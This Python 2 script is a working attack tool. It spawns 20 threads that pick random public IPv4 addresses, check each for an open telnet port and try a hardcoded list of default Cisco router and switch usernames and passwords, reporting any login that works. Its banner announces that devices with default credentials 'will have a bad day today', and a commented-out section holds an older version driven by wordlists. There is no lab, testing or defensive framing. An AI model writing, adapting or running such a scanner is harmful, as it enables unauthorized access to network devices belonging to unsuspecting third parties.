import threading
import telnetlib
import sys
import socket
import random
import thread
import time

print  "|","-"*61, "|"
print "|\tAll of cisco routers , switches with default\t\t|\n|\tusername and passwords are will have a bad day today\t|"
print "|","-"*61, "|"
def bruteForce(ip):
        dict={"Administrator":"admin","|Administrator":"changeme","cisco":"cisco","admin":"admin","|admin":"diamond","||admin":"cisco","root":"Cisco","|root":"password","||root":"blender","|||root":"attack","bbsd-client":"changeme2","cmaker":"cmaker","cusadmin":"password","hsa":"hsadb","netrangr":"attack","wlse":"wlsedb","wlseuser":"wlseuser"}
        for key,value in dict.iteritems():
                key = key.replace("|" , "")
                try:
                        #print " Trying User:",key,"  Password:",value ,"     on " , ip
                        tn = telnetlib.Telnet(ip,23,2)
                        tn.read_until((":" or ">" or "$" or "@"))
                        tn.write(key + "\n")
                        tn.read_until((":" or ">" or "$" or "@"))
                        tn.write(value + "\n")
                        tn.write("dir\n")
                        tn.write("exit\n")
                        tn.read_all()#we can print this to get the banner
                        print "\t\nLogin successful:", key , " -> " , value
                        tn.close()
                        sys.exit(1)
                except Exception ,e:
                        #print ip , " --> " , e
                        pass
                finally:
                        try:
                                tn.close()
                        except Exception , e:
                                pass

        #randy()

def randy():
        a=random.randint(1,254)
        b=random.randint(1,254)
        c=random.randint(1,254)
        d=random.randint(1,4)
        ip=str(a) + "." +str(b) + "." +str(c) + "." +str(d)
        try:
            telnetlib.Telnet(ip , 23 , 2)
            print "Telneting on host : " , ip
            bruteForce(ip)
        except Exception ,e:
            #print ip," => does not have telnet enabled" , e
            randy()
                
for threads in range(0,20):
        thread.start_new_thread(randy,())
        time.sleep(0.5)




"""
if len(sys.argv) !=4:
	print "Usage: ./telnetbrute.py <server> <userlist> <wordlist>"
	sys.exit(1)

#----------------------------------------------------------------
try:
        userlist = open(sys.argv[2], "r").readlines()
        #userlist.close()
        for user in userlist:
                user = user.strip("\n")
                users.append(user)
except(IOError): 
  	print "Error: Check your userlist path\n"
  	sys.exit(1)
#------------------------------------------------------------------
try:
  	wordlist = open(sys.argv[3], "r").readlines()
  	#wordlist.close()
except(IOError):
  	print "Error: Check your wordlist path\n"
  	sys.exit(1)

for word in wordlist:
        words.append(word)


#lock = threading.Lock()
#lock.acquire()
#lock.release()

for key , value in dict.iteritems():
        print key.replace("|","")+"="+value
"""

